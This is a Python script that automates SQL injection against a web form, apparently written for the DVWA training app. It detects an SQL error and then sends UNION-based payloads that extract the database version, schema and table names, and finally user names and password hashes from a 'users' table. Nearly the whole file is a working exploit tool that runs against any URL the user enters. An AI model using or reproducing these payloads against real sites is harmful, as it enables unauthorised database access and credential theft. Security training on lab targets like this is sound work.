import requests
import bs4 as bs
import re
from tabulate import tabulate 


def sqli_func():
    url = input("\nEnter URL : ")
    cookies = {'security' : 'low', 'PHPSESSID':'ev5mlspqdiklrgaqfqbh00act0'}
    initial = " ' "
    form = {"id":initial, "Submit":"Submit"}
    print ("\nTesting >>> " + url)
    first = requests.post(url, cookies = cookies, data = form)
    
    if "You have an error in your SQL syntax;" in first.text:
        print("\n[Detect SQL Injection Vulnerability] : \n\n", url)
    else:
        print("\nNot found Vulnerability : ", '\n\n')
        exit()

    extract = input("\nDid you extract more information [Y/N] : ")
    
    if extract in ("Y", "y"):

        print("\nYou can view Database Version, Table, Host, User information....")
    
        info_db_ver = input("\nDo you want to view database version?[Y/N] : ")

        if info_db_ver in ("Y" ,"y"):
            data_ver = " ' union select 1,@@version# "
            form1 = {"id": data_ver , "Submit":"Submit"}
            request = requests.post(url, cookies = cookies, data = form1 )
            req1 = bs.BeautifulSoup(request.text,'lxml')
            s = re.compile("Surname")
            pre_data = req1.find_all(string=s)
            print("\n [ Found Database Name & Version] \n")
            print(tabulate(pre_data))
        else:
            print("\nOther Options")

        dv_view = input("\nDo You want to view Databases [Y / N] : ")

        if dv_view in ("Y" , "y"):
            dv_ini = " ' UNION select distinct(table_schema),null FROM information_schema.tables# "
            form1 = {"id": dv_ini , "Submit":"Submit"}
            request = requests.post(url, cookies = cookies, data = form1 )
            req1 = bs.BeautifulSoup(request.text,'lxml')
            s = re.compile("First name")
            pre_data = req1.find_all(string=s)
            print("\n [ Found Databases ]\n")
            print(tabulate(pre_data))
        else:
            print("\nOther Options")

        table_view = input("\nDo You want to view Tables [Y / N] : ")

        if table_view in ("Y" , "y"):
            table_ini = " ' UNION SELECT GROUP_CONCAT(table_name),2 FROM information_schema.tables WHERE table_schema=DATABASE()# "
            form1 = {"id": table_ini , "Submit":"Submit"}
            request = requests.post(url, cookies = cookies, data = form1 )
            req1 = bs.BeautifulSoup(request.text,'lxml')
            s = re.compile("First name")
            pre_data = req1.find_all(string=s)
            print("\n [ Found Tables ] \n")
            print(tabulate(pre_data))
        else:
            print("\nOther Options")

        user_view = input("\nDo You want to view User Information [Y / N] : ")

        if user_view in ("Y" , "y"):
            user_ini = " 1' or 1 = 1 union select user,password from users# "
            form1 = {"id": user_ini , "Submit":"Submit"}
            request = requests.post(url, cookies = cookies, data = form1 )
            req1 = bs.BeautifulSoup(request.text,'lxml')
            s = re.compile("Surname")
            pre_data = req1.find_all(string=s)
            print("\n [Found User Information ] \n")
            print(tabulate(pre_data))
            print("\nFinish!\n")
    else:
        print("Bye Bye!")
        exit()

if __name__ == "__main__":
    sqli_func()

